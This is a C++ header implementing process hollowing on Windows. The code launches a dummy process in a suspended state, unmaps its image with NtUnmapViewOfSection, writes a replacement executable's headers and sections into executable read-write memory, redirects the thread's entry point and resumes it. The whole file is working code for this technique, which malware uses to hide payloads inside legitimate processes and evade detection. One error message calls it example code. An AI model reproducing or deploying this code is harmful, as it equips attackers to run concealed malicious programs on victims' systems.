#pragma once

#include <cstdio>
#include <Windows.h>
#include "common.h"
#include "filereader.h"

using pNtUnmapViewOfSection = NTSTATUS (WINAPI *)(HANDLE hProcess, PVOID pBaseAddress);
pNtUnmapViewOfSection NtUnmapViewOfSection = nullptr;

const PROCESS_INFORMATION MapTargetProcess(NewProcessInfo &newProcessInfo, const LPSTR strDummyProcessPath)
{
    PROCESS_INFORMATION processInfo = { 0 };
    STARTUPINFOA startupInfo = { 0 };

    NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection == nullptr)
    {
        fprintf(stderr, "Could not locate NtUnmapViewOfSection.\n");
        exit(-1);
    }

    bool bRet = BOOLIFY(CreateProcessA(nullptr, strDummyProcessPath, nullptr, nullptr, FALSE, CREATE_SUSPENDED,
        nullptr, nullptr, &startupInfo, &processInfo));
    if (!bRet)
    {
        fprintf(stderr, "Could not create dummy process. Error = %X\n",
            GetLastError());
        exit(-1);
    }

    DWORD_PTR dwImageBase = newProcessInfo.pNtHeaders->OptionalHeader.ImageBase;
    SIZE_T ulImageSize = newProcessInfo.pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD dwHeaderSize = newProcessInfo.pNtHeaders->OptionalHeader.SizeOfHeaders;
    WORD wNumberOfSections = newProcessInfo.pNtHeaders->FileHeader.NumberOfSections;

    NTSTATUS ntStatus = NtUnmapViewOfSection(processInfo.hProcess, (PVOID)dwImageBase);
    if (!NT_SUCCESS(ntStatus))
    {
        fprintf(stderr, "Could not unmap view of dummy process. Nt Status = %X\n",
            ntStatus);
        fprintf(stderr, "Check DEP and ASLR settings on the target process. This example code "
            "does not provide a solution that maps into a DEP/ASLR enabled process.\n");
        exit(-1);
    }
    
    LPVOID lpAllocBase = VirtualAllocEx(processInfo.hProcess, (LPVOID)dwImageBase, ulImageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if ((DWORD_PTR)lpAllocBase != dwImageBase)
    {
        fprintf(stderr, "Could not allocate base address of target process into hollow process. Error = %X\n",
            GetLastError());
        exit(-1);
    }

    DWORD dwBytesWritten = 0;
    bRet = BOOLIFY(WriteProcessMemory(processInfo.hProcess, (LPVOID)dwImageBase, newProcessInfo.pFileData.get(),
        dwHeaderSize, &dwBytesWritten));
    if (dwBytesWritten != dwHeaderSize)
    {
        fprintf(stderr, "Could not write in PE header of replacement process. Error = %X\n",
            GetLastError());
        exit(-1);
    }

    for (auto i = 0; i < wNumberOfSections; ++i)
    {
        int iSectionOffset = newProcessInfo.pDosHeader->e_lfanew
            + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i);
        newProcessInfo.pSectionHeader = (IMAGE_SECTION_HEADER *)&(newProcessInfo.pFileData.get()[iSectionOffset]);

        bRet = BOOLIFY(WriteProcessMemory(processInfo.hProcess,
            (LPVOID)(dwImageBase + newProcessInfo.pSectionHeader->VirtualAddress),
            &newProcessInfo.pFileData.get()[newProcessInfo.pSectionHeader->PointerToRawData],
            newProcessInfo.pSectionHeader->SizeOfRawData, &dwBytesWritten));
        if (!bRet)
        {
            fprintf(stderr, "Could not write in section to target process. Error = %X\n",
                GetLastError());
            exit(-1);
        }
    }

    return processInfo;
}

void RunTargetProcess(const NewProcessInfo &newProcessInfo, const PROCESS_INFORMATION &processInfo)
{
    CONTEXT ctx = { CONTEXT_FULL };
    BOOL bRet = BOOLIFY(GetThreadContext(processInfo.hThread, &ctx));
    if (!bRet)
    {
        fprintf(stderr, "Could not get thread context. Error = %X\n", GetLastError());
        exit(-1);
    }
	//std::cout << bRet << std::endl;
    ctx.Eax = newProcessInfo.pNtHeaders->OptionalHeader.ImageBase
        + newProcessInfo.pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    bRet = BOOLIFY(SetThreadContext(processInfo.hThread, &ctx));
    if (!bRet)
    {
        fprintf(stderr, "Could not set thread context. Error = %X\n", GetLastError());
        exit(-1);
    }

    (void)ResumeThread(processInfo.hThread);

}